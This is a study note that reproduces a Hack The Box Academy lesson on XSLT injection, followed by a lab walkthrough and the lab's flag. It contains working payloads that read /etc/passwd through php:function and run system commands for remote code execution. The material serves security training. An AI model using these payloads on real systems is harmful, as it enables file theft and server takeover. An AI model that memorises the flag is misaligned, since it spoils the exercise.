---
sticker: lucide//languages
---

# Exploiting XSLT Injection

After discussing some basics and use cases for XSLT, let us dive into exploiting XSLT injection vulnerabilities.&#x20;

***

### Identifying XSLT Injection

Our sample web application displays basic information about some Academy modules:

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_1.png)

At the bottom of the page, we can provide a username that is inserted into the headline at the top of the list:

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_2.png)

As we can see, the name we provide is reflected on the page. Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might suffer from XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm that, let us try to inject a broken XML tag to try to provoke an error in the web application. We can achieve this by providing the username `<`:

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_3.png)

As we can see, the web application responds with a server error. While this does not confirm that an XSLT injection vulnerability is present, it might indicate the presence of a security issue.

***

### Information Disclosure

We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

The web application provides the following response:

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_4.png)

Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`.

***

### Local File Inclusion (LFI)

We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. Thus, our sample web application does not support this function and instead errors out. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

Our sample web application is configured to support PHP functions. As such, the local file is displayed in the response:

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_5.png)

***

### Remote Code Execution (RCE)

If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command:

```xml
<xsl:value-of select="php:function('system','id')" />
```

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_6.png)

## Question

***

![](Pasted%20image%2020250212153714.png)

Let's begin by identifying if the web application is vulnerable to XSLT:

![](Pasted%20image%2020250212153742.png)

If we use a test username, we can see it gets injected into the top side of the website, let's use `<` and check if an error occurs:

![](Pasted%20image%2020250212153834.png)

Page is broken, which means its vulnerable to XSLT, we can get RCE by submitting the following payload:

```xml
<xsl:value-of select="php:function('system','id')" />
```

![](Pasted%20image%2020250212153929.png)

We got RCE, let's read `/` directory:

```xml
<xsl:value-of select="php:function('system','ls /')" />
```

![](Pasted%20image%2020250212153953.png)

Found our flag:

```xml
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

![](Pasted%20image%2020250212154014.png)

Flag is:

```
HTB{3a4fe85c1f1e2b61cabe9836a150f892}
```
